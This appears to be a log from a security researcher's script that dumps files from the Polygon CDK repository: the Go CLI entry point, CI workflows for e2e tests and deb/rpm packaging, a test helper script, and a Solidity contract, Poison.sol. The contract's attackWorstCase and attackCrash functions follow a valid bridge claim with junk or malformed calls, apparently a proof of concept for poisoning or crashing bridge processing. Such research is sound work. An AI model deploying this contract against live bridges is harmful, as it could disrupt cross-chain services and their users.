@@ -1,0 +1,935 @@
+════════════════════════════════════════════════════════
+  MEMBACA SEMUA FILE POC DI SELURUH /workspaces
+════════════════════════════════════════════════════════
+
+[1] Mencari file yang mengandung keyword (poison, claim, halt, dll)...
+/workspaces/cdk/cmd/main.go
+/workspaces/cdk/.github/workflows/test-e2e-pp.yml
+/workspaces/cdk/.github/workflows/x86_deb_packager.yml
+/workspaces/cdk/.github/workflows/arm_rpm_packager.yml
+/workspaces/cdk/.github/workflows/arm_deb_packager.yml
+/workspaces/cdk/.github/workflows/test-e2e.yml
+/workspaces/cdk/.github/workflows/test-e2e-multi_pp.yml
+/workspaces/cdk/.github/workflows/x86_rpm_packager.yml
+/workspaces/cdk/test/poison/src/Poison.sol
+/workspaces/cdk/test/scripts/shared.sh
+
+[2] Isi Dari File-File Yang Ditemukan:
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/cmd/main.go
+════════════════════════════════════════════════════════
+package main
+
+import (
+	"os"
+
+	zkevm "github.com/0xPolygon/cdk"
+	"github.com/0xPolygon/cdk/common"
+	"github.com/0xPolygon/cdk/config"
+	"github.com/0xPolygon/cdk/log"
+	"github.com/urfave/cli/v2"
+)
+
+const appName = "cdk"
+
+const (
+	// NETWORK_CONFIGFILE name to identify the network_custom (genesis) config-file
+	NETWORK_CONFIGFILE = "custom_network" //nolint:stylecheck
+)
+
+var (
+	configFileFlag = cli.StringSliceFlag{
+		Name:     config.FlagCfg,
+		Aliases:  []string{"c"},
+		Usage:    "Configuration file(s)",
+		Required: true,
+	}
+	customNetworkFlag = cli.StringFlag{
+		Name:     config.FlagCustomNetwork,
+		Aliases:  []string{"net-file"},
+		Usage:    "Load the network configuration file if --network=custom",
+		Required: false,
+	}
+	yesFlag = cli.BoolFlag{
+		Name:     config.FlagYes,
+		Aliases:  []string{"y"},
+		Usage:    "Automatically accepts any confirmation to execute the command",
+		Required: false,
+	}
+	componentsFlag = cli.StringSliceFlag{
+		Name:     config.FlagComponents,
+		Aliases:  []string{"co"},
+		Usage:    "List of components to run",
+		Required: false,
+		Value: cli.NewStringSlice(common.SEQUENCE_SENDER, common.AGGREGATOR,
+			common.AGGORACLE, common.BRIDGE, common.AGGSENDER),
+	}
+	saveConfigFlag = cli.StringFlag{
+		Name:     config.FlagSaveConfigPath,
+		Aliases:  []string{"s"},
+		Usage:    "Save final configuration into to the indicated path (name: cdk-node-config.toml)",
+		Required: false,
+	}
+	disableDefaultConfigVars = cli.BoolFlag{
+		Name:     config.FlagDisableDefaultConfigVars,
+		Aliases:  []string{"d"},
+		Usage:    "Disable default configuration variables, all of them must be defined on config files",
+		Required: false,
+	}
+
+	allowDeprecatedFields = cli.BoolFlag{
+		Name:     config.FlagAllowDeprecatedFields,
+		Usage:    "Allow that config-files contains deprecated fields",
+		Required: false,
+	}
+)
+
+func main() {
+	app := cli.NewApp()
+	app.Name = appName
+	app.Version = zkevm.Version
+	flags := []cli.Flag{
+		&configFileFlag,
+		&yesFlag,
+		&componentsFlag,
+		&saveConfigFlag,
+		&disableDefaultConfigVars,
+		&allowDeprecatedFields,
+	}
+	app.Commands = []*cli.Command{
+		{
+			Name:    "version",
+			Aliases: []string{},
+			Usage:   "Application version and build",
+			Action:  versionCmd,
+		},
+		{
+			Name:    "run",
+			Aliases: []string{},
+			Usage:   "Run the cdk client",
+			Action:  start,
+			Flags:   append(flags, &customNetworkFlag),
+		},
+	}
+
+	err := app.Run(os.Args)
+	if err != nil {
+		log.Fatal(err)
+		os.Exit(1)
+	}
+}
+
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/.github/workflows/test-e2e-pp.yml
+════════════════════════════════════════════════════════
+name: Test e2e pp
+on: 
+  push:
+    branches:
+      - '**'
+  workflow_dispatch: {}
+
+
+jobs:
+  build-cdk-image:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - uses: actions/setup-go@v5
+      with:
+        go-version: 1.23.x
+
+    - name: Build cdk docker image
+      run: make build-docker
+    
+    - name: Save cdk image to archive
+      run: docker save --output /tmp/cdk.tar cdk
+    
+    - name: Upload archive
+      uses: actions/upload-artifact@v4
+      with:
+        name: cdk
+        path: /tmp/cdk.tar
+
+  test-e2e:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    needs: build-cdk-image
+    strategy:
+      fail-fast: false
+      matrix:
+        e2e-group:
+          - "fork12-pessimistic"
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v4
+    
+    - name: Checkout Kurtosis CDK
+      uses: actions/checkout@v4
+      with:
+        repository: 0xPolygon/kurtosis-cdk
+        path: kurtosis-cdk
+        ref: v0.2.31
+    
+    - name: Install Kurtosis CDK tools
+      uses: ./kurtosis-cdk/.github/actions/setup-kurtosis-cdk
+    
+    - name: Install polycli
+      run: |
+        POLYCLI_VERSION="${{ vars.POLYCLI_VERSION }}"
+        tmp_dir=$(mktemp -d) 
+        curl -L "https://github.com/0xPolygon/polygon-cli/releases/download/${POLYCLI_VERSION}/polycli_${POLYCLI_VERSION}_linux_amd64.tar.gz" | tar -xz -C "$tmp_dir" 
+        mv "$tmp_dir"/* /usr/local/bin/polycli 
+        rm -rf "$tmp_dir"
+        sudo chmod +x /usr/local/bin/polycli
+        /usr/local/bin/polycli version
+
+    - name: Setup Bats and bats libs
+      uses: bats-core/bats-action@2.0.0
+    
+    - name: Download cdk archive
+      uses: actions/download-artifact@v4
+      with:
+        name: cdk
+        path: /tmp
+    
+    - name: Load cdk image
+      run: |
+        docker load --input /tmp/cdk.tar
+        docker image ls -a
+
+    - name: Run e2e tests
+      run: make test-e2e-${{ matrix.e2e-group }}
+      working-directory: test
+      env:
+        KURTOSIS_FOLDER: ${{ github.workspace }}/kurtosis-cdk
+        BATS_LIB_PATH: /usr/lib/
+        agglayer_prover_sp1_key: ${{ secrets.SP1_PRIVATE_KEY }}
+
+    
+    - name: Dump enclave logs
+      if: failure()
+      run: kurtosis dump ./dump
+
+    - name: Generate archive name
+      if: failure()
+      run: |
+        archive_name="dump_run_with_args_${{matrix.e2e-group}}_${{ github.run_id }}"
+        echo "ARCHIVE_NAME=${archive_name}" >> "$GITHUB_ENV"
+        echo "Generated archive name: ${archive_name}"
+        kurtosis service exec cdk cdk-node-001 'cat /etc/cdk/cdk-node-config.toml' > ./dump/cdk-node-config.toml
+
+    - name: Upload logs
+      if: failure()
+      uses: actions/upload-artifact@v4
+      with:
+        name: ${{ env.ARCHIVE_NAME }}
+        path: ./dump
+
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/.github/workflows/x86_deb_packager.yml
+════════════════════════════════════════════════════════
+name: x86_deb_packager
+
+
+on:
+  push:
+    branches:
+      - 'main'
+    paths:
+      - '**'
+    tags:
+      - 'v*.*.*'
+      - 'v*.*.*-*'
+
+jobs:
+  build:
+    permissions:
+      id-token: write
+      contents: write
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Set up Go
+        uses: actions/setup-go@master
+        with:
+          go-version: 1.23.x
+      # Variables
+      - name: Adding TAG to ENV
+        run: echo "GIT_TAG=`echo $(git describe --tags --abbrev=0)`" >> $GITHUB_ENV
+      - name: adding version
+        run: |
+          NUMERIC_VERSION=$( echo ${{ env.GIT_TAG }} | sed 's/[^0-9.]//g' ) 
+          echo "VERSION=$NUMERIC_VERSION" >> $GITHUB_ENV
+
+      - name: go mod download
+        run: go mod download
+
+      - name: Build the binary
+        run: make build
+
+      - name: Build the rust binary
+        run: |
+          BUILD_SCRIPT_DISABLED=1
+          cargo build --release --bin cdk
+
+      - name: making directory structure
+        run: mkdir -p packaging/deb/cdk/usr/bin/
+      - name: copying necessary binary for amd64
+        run: cp -rp target/cdk-node packaging/deb/cdk/usr/bin/cdk-node
+      - name: copying rust binary for amd64
+        run: cp -rp target/release/cdk packaging/deb/cdk/usr/bin/cdk
+
+      # Control file creation
+      - name: Create control file
+        run: |
+          echo "Package: cdk" >> packaging/deb/cdk/DEBIAN/control
+          echo "Version: ${{ env.VERSION }}" >> packaging/deb/cdk/DEBIAN/control
+          echo "Section: base" >> packaging/deb/cdk/DEBIAN/control
+          echo "Priority: optional" >> packaging/deb/cdk/DEBIAN/control
+          echo "Architecture: amd64" >> packaging/deb/cdk/DEBIAN/control
+          echo "Maintainer: devops@polygon.technology" >> packaging/deb/cdk/DEBIAN/control
+          echo "Description: cdk binary package" >> packaging/deb/cdk/DEBIAN/control
+
+      - name: Creating package for binary for cdk ${{ env.ARCH }}
+        run: cp -rp packaging/deb/cdk packaging/deb/cdk-${{ env.GIT_TAG }}-${{ env.ARCH }}
+        env:
+          ARCH: amd64
+
+      - name: Running package build
+        run: dpkg-deb --build --root-owner-group packaging/deb/cdk-${{ env.GIT_TAG }}-${{ env.ARCH }}
+        env:
+          ARCH: amd64
+
+      - name: Create checksum for the amd64 package
+        run: cd packaging/deb/ && sha256sum cdk-${{ env.GIT_TAG }}-${{ env.ARCH }}.deb > cdk-${{ env.GIT_TAG }}-${{ env.ARCH }}.deb.checksum
+        env:
+          ARCH: amd64
+
+
+      - name: Release cdk Packages
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ env.GIT_TAG }}
+          prerelease: true
+          files: |
+            packaging/deb/cdk**.deb
+            packaging/deb/cdk**.deb.checksum
+
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/.github/workflows/arm_rpm_packager.yml
+════════════════════════════════════════════════════════
+name: arm_rpm_packager
+
+on:
+  push:
+    branches:
+      - 'main'
+    paths:
+      - '**'
+    tags:
+      - 'v*.*.*'
+      - 'v*.*.*-*'
+
+jobs:
+  build:
+    permissions:
+      id-token: write
+      contents: write
+    runs-on:
+      labels: arm-runner-2204
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Set up Go
+        uses: actions/setup-go@master
+        with:
+          go-version: 1.23.x
+      - name: Adding TAG to ENV
+        run: echo "GIT_TAG=`echo $(git describe --tags --abbrev=0)`" >> $GITHUB_ENV
+
+      - name: Adding a TAG.1 to the env
+        run: echo "GIT_TAG1=`echo $(git describe --tags --abbrev=0)`" | sed 's/-/./g' >> $GITHUB_ENV
+
+      - name: Download deps for project
+        run: go mod download
+
+      - name: Building cdk-node for amd64
+        run: make build
+
+      - name: Building the cdk
+        run: |
+          BUILD_SCRIPT_DISABLED=1
+          cargo build --release --bin cdk
+
+      - name: Installing some dependencies
+        run: sudo apt-get update && sudo apt-get install -y rpm
+
+      - name: Setup rpm package for binary
+        run: |
+          mkdir -p packaging/rpm/SPECS
+          mkdir -p packaging/rpm/BUILD
+          mkdir -p packaging/rpm/RPMS
+          mkdir -p packaging/rpm/SRPMS
+          
+          touch packaging/rpm/cdk.spec 
+          echo "Name: cdk" >> packaging/rpm/SPECS/cdk.spec
+          echo "Version: ${{ env.GIT_TAG1 }}" >> packaging/rpm/SPECS/cdk.spec
+          echo "Release: 1%{?dist}" >> packaging/rpm/SPECS/cdk.spec
+          echo "License: GPL/AGPL" >> packaging/rpm/SPECS/cdk.spec
+          echo "BuildArch: aarch64" >> packaging/rpm/SPECS/cdk.spec
+          echo "Summary: cdk rpm package" >> packaging/rpm/SPECS/cdk.spec
+          
+          echo "%description" >> packaging/rpm/SPECS/cdk.spec
+          echo "cdk rpm package" >> packaging/rpm/SPECS/cdk.spec
+          
+          echo "%pre" >> packaging/rpm/SPECS/cdk.spec
+          echo "getent group cdk >/dev/null || groupadd -r cdk" >> packaging/rpm/SPECS/cdk.spec
+          echo "getent passwd cdk >/dev/null || useradd -s /bin/false -d /opt/cdk -r cdk -g cdk" >> packaging/rpm/SPECS/cdk.spec
+          
+          echo "%install" >> packaging/rpm/SPECS/cdk.spec
+          echo "mkdir -p %{buildroot}/usr/bin" >> packaging/rpm/SPECS/cdk.spec
+          echo "cp /home/runner/work/cdk/cdk/target/cdk-node %{buildroot}/usr/bin/cdk-node" >> packaging/rpm/SPECS/cdk.spec
+          echo "cp /home/runner/work/cdk/cdk/target/release/cdk %{buildroot}/usr/bin/cdk" >> packaging/rpm/SPECS/cdk.spec
+          
+          echo "%files" >> packaging/rpm/SPECS/cdk.spec
+          echo "/usr/bin/cdk" >> packaging/rpm/SPECS/cdk.spec
+          echo "/usr/bin/cdk-node" >> packaging/rpm/SPECS/cdk.spec
+
+
+      - name: Construct rpm package
+        run: |
+          rpmbuild --define "_topdir /home/runner/work/cdk/cdk/packaging/rpm_build" \
+                   --define "_builddir %{_topdir}/BUILD" \
+                   --define "_rpmdir %{_topdir}/RPMS" \
+                   --define "_srcrpmdir %{_topdir}/SRPMS" \
+                   --define "__spec_install_post /bin/true" \
+                   -bb packaging/rpm/SPECS/cdk.spec
+
+      - name: Rename file for post rpm build and for checksum
+        run: mv /home/runner/work/cdk/cdk/packaging/rpm_build/RPMS/aarch64/cdk-${{ env.GIT_TAG1 }}-1.aarch64.rpm /home/runner/work/cdk/cdk/packaging/rpm_build/RPMS/aarch64/cdk-${{ env.GIT_TAG1 }}.aarch64.rpm
+
+      - name: Checksum for the rpm package
+        run: sha256sum /home/runner/work/cdk/cdk/packaging/rpm_build/RPMS/aarch64/cdk-${{ env.GIT_TAG1 }}.aarch64.rpm > /home/runner/work/cdk/cdk/packaging/rpm_build/RPMS/aarch64/cdk-${{ env.GIT_TAG1 }}.aarch64.rpm.checksum
+
+      - name: Release cdk Packages
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ env.GIT_TAG }}
+          prerelease: true
+          files: |
+            packaging/rpm_build/RPMS/aarch64/cdk-**.rpm
+            packaging/rpm_build/RPMS/aarch64/cdk-**.rpm.checksum
+
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/.github/workflows/arm_deb_packager.yml
+════════════════════════════════════════════════════════
+name: arm_deb_packager
+
+
+on:
+  push:
+    branches:
+      - 'main'
+    paths:
+      - '**'
+    tags:
+      - 'v*.*.*'
+      - 'v*.*.*-*'
+
+jobs:
+  build:
+    permissions:
+      id-token: write
+      contents: write
+    runs-on:
+      labels: arm-runner-2204
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Set up Go
+        uses: actions/setup-go@master
+        with:
+          go-version: 1.23.x
+      # Variables
+      - name: Adding TAG to ENV
+        run: echo "GIT_TAG=`echo $(git describe --tags --abbrev=0)`" >> $GITHUB_ENV
+      - name: adding version
+        run: |
+          NUMERIC_VERSION=$( echo ${{ env.GIT_TAG }} | sed 's/[^0-9.]//g' ) 
+          echo "VERSION=$NUMERIC_VERSION" >> $GITHUB_ENV
+
+      - name: go mod download
+        run: go mod download
+
+      - name: Build the binary
+        run: make build
+
+      - name: Build the rust binary
+        run: |
+          BUILD_SCRIPT_DISABLED=1
+          cargo build --release --bin cdk
+
+      - name: making directory structure
+        run: mkdir -p packaging/deb/cdk/usr/bin/
+      - name: copying necessary binary for arm64
+        run: cp -rp target/cdk-node packaging/deb/cdk/usr/bin/cdk-node
+      - name: copying rust binary for arm64
+        run: cp -rp target/release/cdk packaging/deb/cdk/usr/bin/cdk
+
+      # Control file creation
+      - name: Create control file
+        run: |
+          echo "Package: cdk" >> packaging/deb/cdk/DEBIAN/control
+          echo "Version: ${{ env.VERSION }}" >> packaging/deb/cdk/DEBIAN/control
+          echo "Section: base" >> packaging/deb/cdk/DEBIAN/control
+          echo "Priority: optional" >> packaging/deb/cdk/DEBIAN/control
+          echo "Architecture: arm64" >> packaging/deb/cdk/DEBIAN/control
+          echo "Maintainer: devops@polygon.technology" >> packaging/deb/cdk/DEBIAN/control
+          echo "Description: cdk binary package" >> packaging/deb/cdk/DEBIAN/control
+
+      - name: Creating package for binary for cdk ${{ env.ARCH }}
+        run: cp -rp packaging/deb/cdk packaging/deb/cdk-${{ env.GIT_TAG }}-${{ env.ARCH }}
+        env:
+          ARCH: arm64
+
+      - name: Running package build
+        run: dpkg-deb --build --root-owner-group packaging/deb/cdk-${{ env.GIT_TAG }}-${{ env.ARCH }}
+        env:
+          ARCH: arm64
+
+      - name: create checksum for the arm64 package
+        run: cd packaging/deb/ && sha256sum cdk-${{ env.GIT_TAG }}-${{ env.ARCH }}.deb > cdk-${{ env.GIT_TAG }}-${{ env.ARCH }}.deb.checksum
+        env:
+          ARCH: arm64
+
+      - name: Release cdk Packages
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ env.GIT_TAG }}
+          prerelease: true
+          files: |
+            packaging/deb/cdk**.deb
+            packaging/deb/cdk**.deb.checksum
+
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/.github/workflows/test-e2e.yml
+════════════════════════════════════════════════════════
+name: Test e2e
+on: 
+  push:
+    branches:
+      - '**'
+  workflow_dispatch: {}
+
+
+jobs:
+  build-cdk-image:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - uses: actions/setup-go@v5
+      with:
+        go-version: 1.23.x
+
+    - name: Build cdk docker image
+      run: make build-docker
+    
+    - name: Save cdk image to archive
+      run: docker save --output /tmp/cdk.tar cdk
+    
+    - name: Upload archive
+      uses: actions/upload-artifact@v4
+      with:
+        name: cdk
+        path: /tmp/cdk.tar
+
+  test-e2e:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    needs: build-cdk-image
+    strategy:
+      fail-fast: false
+      matrix:
+        e2e-group:
+          - "fork9-validium"
+          - "fork11-rollup"
+          - "fork12-validium"
+          - "fork12-rollup"
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v4
+    
+    - name: Checkout Kurtosis CDK
+      uses: actions/checkout@v4
+      with:
+        repository: 0xPolygon/kurtosis-cdk
+        path: kurtosis-cdk
+        ref: v0.3.3
+    
+    - name: Install Kurtosis CDK tools
+      uses: ./kurtosis-cdk/.github/actions/setup-kurtosis-cdk
+    
+    - name: Install polycli
+      run: |
+        POLYCLI_VERSION="${{ vars.POLYCLI_VERSION }}"
+        tmp_dir=$(mktemp -d) 
+        curl -L "https://github.com/0xPolygon/polygon-cli/releases/download/${POLYCLI_VERSION}/polycli_${POLYCLI_VERSION}_linux_amd64.tar.gz" | tar -xz -C "$tmp_dir" 
+        mv "$tmp_dir"/* /usr/local/bin/polycli 
+        rm -rf "$tmp_dir"
+        sudo chmod +x /usr/local/bin/polycli
+        /usr/local/bin/polycli version
+
+    - name: Setup Bats and bats libs
+      uses: bats-core/bats-action@2.0.0
+    
+    - name: Download cdk archive
+      uses: actions/download-artifact@v4
+      with:
+        name: cdk
+        path: /tmp
+    
+    - name: Load cdk image
+      run: |
+        docker load --input /tmp/cdk.tar
+        docker image ls -a
+
+    - name: Run e2e tests
+      run: make test-e2e-${{ matrix.e2e-group }}
+      working-directory: test
+      env:
+        KURTOSIS_FOLDER: ${{ github.workspace }}/kurtosis-cdk
+        BATS_LIB_PATH: /usr/lib/
+        agglayer_prover_sp1_key: ${{ secrets.SP1_PRIVATE_KEY }}
+
+    
+    - name: Dump enclave logs
+      if: failure()
+      run: kurtosis dump ./dump
+
+    - name: Generate archive name
+      if: failure()
+      run: |
+        archive_name="dump_run_with_args_${{matrix.e2e-group}}_${{ github.run_id }}"
+        echo "ARCHIVE_NAME=${archive_name}" >> "$GITHUB_ENV"
+        echo "Generated archive name: ${archive_name}"
+        kurtosis service exec cdk cdk-node-001 'cat /etc/cdk/cdk-node-config.toml' > ./dump/cdk-node-config.toml
+
+    - name: Upload logs
+      if: failure()
+      uses: actions/upload-artifact@v4
+      with:
+        name: ${{ env.ARCHIVE_NAME }}
+        path: ./dump
+
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/.github/workflows/test-e2e-multi_pp.yml
+════════════════════════════════════════════════════════
+# based on: https://github.com/0xPolygon/kurtosis-cdk/tree/main/docs/multi-pp-testing
+name: Test e2e multi pp
+on: 
+  push:
+    branches:
+      - '**'
+  workflow_dispatch: {}
+
+jobs:
+  
+  test-e2e-multi_pp:
+    strategy:
+      fail-fast: false
+      matrix:
+        go-version: [ 1.23.x ]
+        goarch: [ "amd64" ]
+        e2e-group:
+          - "fork12-pessimistic"
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Install Go
+      uses: actions/setup-go@v5
+      with:
+        go-version: ${{ matrix.go-version }}
+      env:
+        GOARCH: ${{ matrix.goarch }}
+
+    - name: Build Docker
+      run: make build-docker
+    
+    - name: Build Tools
+      run: make build-tools
+      
+    - name: Checkout Kurtosis CDK
+      uses: actions/checkout@v4
+      with:
+        repository: 0xPolygon/kurtosis-cdk
+        path: kurtosis-cdk
+        ref: v0.2.31
+    
+    - name: Install Kurtosis CDK tools
+      uses: ./kurtosis-cdk/.github/actions/setup-kurtosis-cdk
+
+    - name: Setup Bats and bats libs
+      uses: bats-core/bats-action@2.0.0
+
+    - name: Test
+      run: make test-e2e-fork12-multi-pessimistic
+
+      working-directory: test
+      env:
+        KURTOSIS_FOLDER: ${{ github.workspace }}/kurtosis-cdk
+        BATS_LIB_PATH: /usr/lib/
+        agglayer_prover_sp1_key: ${{ secrets.SP1_PRIVATE_KEY }}
+    
+    - name: Dump enclave logs
+      if: failure()
+      run: kurtosis dump ./dump
+
+    - name: Generate archive name
+      if: failure()
+      run: |
+        archive_name="dump_run_with_args_${{matrix.e2e-group}}_${{ github.run_id }}"
+        echo "ARCHIVE_NAME=${archive_name}" >> "$GITHUB_ENV"
+        echo "Generated archive name: ${archive_name}"
+        kurtosis service exec cdk cdk-node-001 'cat /etc/cdk/cdk-node-config.toml' > ./dump/cdk-node-config.toml
+
+    - name: Upload logs
+      if: failure()
+      uses: actions/upload-artifact@v4
+      with:
+        name: ${{ env.ARCHIVE_NAME }}
+        path: ./dump
+
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/.github/workflows/x86_rpm_packager.yml
+════════════════════════════════════════════════════════
+name: x86_rpm_packager
+
+on:
+  push:
+    branches:
+      - 'main'
+    paths:
+      - '**'
+    tags:
+      - 'v*.*.*'
+      - 'v*.*.*-*'
+
+jobs:
+  build:
+    permissions:
+      id-token: write
+      contents: write
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Set up Go
+        uses: actions/setup-go@master
+        with:
+          go-version: 1.23.x
+      - name: Adding TAG to ENV
+        run: echo "GIT_TAG=`echo $(git describe --tags --abbrev=0)`" >> $GITHUB_ENV
+
+      - name: Adding a TAG.1 to the env
+        run: echo "GIT_TAG1=`echo $(git describe --tags --abbrev=0)`" | sed 's/-/./g' >> $GITHUB_ENV
+
+      - name: Download deps for project
+        run: go mod download
+
+      - name: Building cdk-node for amd64
+        run: make build
+
+      - name: Building the cdk
+        run: |
+          BUILD_SCRIPT_DISABLED=1
+          cargo build --release --bin cdk
+
+      - name: Installing some dependencies
+        run: sudo apt-get update && sudo apt-get install -y rpm
+
+      - name: Setup rpm package for binary
+        run: |
+          mkdir -p packaging/rpm/SPECS
+          mkdir -p packaging/rpm/BUILD
+          mkdir -p packaging/rpm/RPMS
+          mkdir -p packaging/rpm/SRPMS
+          
+          touch packaging/rpm/cdk.spec 
+          echo "Name: cdk" >> packaging/rpm/SPECS/cdk.spec
+          echo "Version: ${{ env.GIT_TAG1 }}" >> packaging/rpm/SPECS/cdk.spec
+          echo "Release: 1%{?dist}" >> packaging/rpm/SPECS/cdk.spec
+          echo "License: GPL/AGPL" >> packaging/rpm/SPECS/cdk.spec
+          echo "BuildArch: x86_64" >> packaging/rpm/SPECS/cdk.spec
+          echo "Summary: cdk rpm package" >> packaging/rpm/SPECS/cdk.spec
+          
+          echo "%description" >> packaging/rpm/SPECS/cdk.spec
+          echo "cdk rpm package" >> packaging/rpm/SPECS/cdk.spec
+          
+          echo "%pre" >> packaging/rpm/SPECS/cdk.spec
+          echo "getent group cdk >/dev/null || groupadd -r cdk" >> packaging/rpm/SPECS/cdk.spec
+          echo "getent passwd cdk >/dev/null || useradd -s /bin/false -d /opt/cdk -r cdk -g cdk" >> packaging/rpm/SPECS/cdk.spec
+          
+          echo "%install" >> packaging/rpm/SPECS/cdk.spec
+          echo "mkdir -p %{buildroot}/usr/bin" >> packaging/rpm/SPECS/cdk.spec
+          echo "cp /home/runner/work/cdk/cdk/target/cdk-node %{buildroot}/usr/bin/cdk-node" >> packaging/rpm/SPECS/cdk.spec
+          echo "cp /home/runner/work/cdk/cdk/target/release/cdk %{buildroot}/usr/bin/cdk" >> packaging/rpm/SPECS/cdk.spec
+          
+          echo "%files" >> packaging/rpm/SPECS/cdk.spec
+          echo "/usr/bin/cdk" >> packaging/rpm/SPECS/cdk.spec
+          echo "/usr/bin/cdk-node" >> packaging/rpm/SPECS/cdk.spec
+
+
+      - name: Construct rpm package
+        run: |
+          rpmbuild --define "_topdir /home/runner/work/cdk/cdk/packaging/rpm_build" \
+                   --define "_builddir %{_topdir}/BUILD" \
+                   --define "_rpmdir %{_topdir}/RPMS" \
+                   --define "_srcrpmdir %{_topdir}/SRPMS" \
+                   --define "__spec_install_post /bin/true" \
+                   -bb packaging/rpm/SPECS/cdk.spec
+
+      - name: Rename file for post rpm build and for checksum
+        run: mv /home/runner/work/cdk/cdk/packaging/rpm_build/RPMS/x86_64/cdk-${{ env.GIT_TAG1 }}-1.x86_64.rpm /home/runner/work/cdk/cdk/packaging/rpm_build/RPMS/x86_64/cdk-${{ env.GIT_TAG1 }}.x86_64.rpm
+
+      - name: Checksum for the rpm package
+        run: sha256sum /home/runner/work/cdk/cdk/packaging/rpm_build/RPMS/x86_64/cdk-${{ env.GIT_TAG1 }}.x86_64.rpm > /home/runner/work/cdk/cdk/packaging/rpm_build/RPMS/x86_64/cdk-${{ env.GIT_TAG1 }}.x86_64.rpm.checksum
+
+      - name: Release cdk Packages
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ env.GIT_TAG }}
+          prerelease: true
+          files: |
+            packaging/rpm_build/RPMS/x86_64/cdk-**.rpm
+            packaging/rpm_build/RPMS/x86_64/cdk-**.rpm.checksum
+
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/test/poison/src/Poison.sol
+════════════════════════════════════════════════════════
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IBridge {
+    function claimAsset(
+        bytes32[32] calldata smtProofLocalExitRoot,
+        bytes32[32] calldata smtProofRollupExitRoot,
+        uint256 globalIndex,
+        bytes32 mainnetExitRoot,
+        bytes32 rollupExitRoot,
+        uint32 originNetwork,
+        address originTokenAddress,
+        uint32 destinationNetwork,
+        address destinationAddress,
+        uint256 amount,
+        bytes calldata metadata
+    ) external;
+}
+
+contract Poison {
+    IBridge public immutable bridge;
+
+    constructor(IBridge _bridge) { bridge = _bridge; }
+
+    function _split(bytes calldata blob) internal pure returns (bytes32[32] memory r) {
+        require(blob.length == 1024, "blob must be 1024 bytes");
+        for (uint256 i = 0; i < 32; ++i) r[i] = bytes32(blob[i * 32:(i + 1) * 32]);
+    }
+
+    function attackWorstCase(
+        bytes calldata proofBlob,
+        uint256 globalIndex,
+        bytes32 mainnetExitRoot,
+        bytes32 rollupExitRoot,
+        uint32 originNetwork,
+        address originToken,
+        uint32 destinationNetwork,
+        address destinationAddress,
+        uint256 amount,
+        bytes calldata metadata,
+        bytes calldata junkMetadata,
+        uint32 junkDestNet
+    ) external {
+        bytes32[32] memory proof = _split(proofBlob);
+        bytes32[32] memory zero;
+
+        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
+            originNetwork, originToken, destinationNetwork, destinationAddress,
+            amount, metadata);
+
+        (bool ok, ) = address(bridge).call(abi.encodeCall(
+            IBridge.claimAsset,
+            (zero, zero, globalIndex, mainnetExitRoot, rollupExitRoot,
+             originNetwork, originToken, junkDestNet, destinationAddress,
+             amount, junkMetadata)
+        ));
+        ok;
+    }
+
+    function attackCrash(
+        bytes calldata proofBlob,
+        uint256 globalIndex, bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
+        uint32 originNetwork, address originToken, uint32 destinationNetwork,
+        address destinationAddress, uint256 amount, bytes calldata metadata
+    ) external {
+        bytes32[32] memory proof = _split(proofBlob);
+        bytes32[32] memory zero;
+        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
+            originNetwork, originToken, destinationNetwork, destinationAddress,
+            amount, metadata);
+        (bool ok, ) = address(bridge).call(hex"1234");
+        ok;
+    }
+}
+
+
+════════════════════════════════════════════════════════
+>>> FILE: /workspaces/cdk/test/scripts/shared.sh
+════════════════════════════════════════════════════════
+
+function override_cdk_node_config_file(){
+    local __DATA_AVAILABILITY_MODE=$1
+    if [ -z $__DATA_AVAILABILITY_MODE ]; then
+        echo "Missing DATA_AVAILABILITY_MODE:override_cdk_node_config_file  ['rollup', 'cdk-validium', 'pessimistic']"
+        return 1
+    fi
+    echo "Override cdk config file"
+    local _FILENAME=$BASE_FOLDER/config/kurtosis-cdk-node-config.toml.template.$__DATA_AVAILABILITY_MODE
+    cp $_FILENAME $KURTOSIS_FOLDER/templates/trusted-node/cdk-node-config.toml
+    if [ $? -ne 0 ]; then
+        echo "... copying generic config file"
+        _FILENAME=$BASE_FOLDER/config/kurtosis-cdk-node-config.toml.template
+        cp $_FILENAME $KURTOSIS_FOLDER/templates/trusted-node/cdk-node-config.toml
+    fi
+    echo "Override cdk config using: " $_FILENAME
+}
+
+════════════════════════════════════════════════════════
+  REKAP SELESAI. Cek output di atas atau buka file: all-poc-files.log
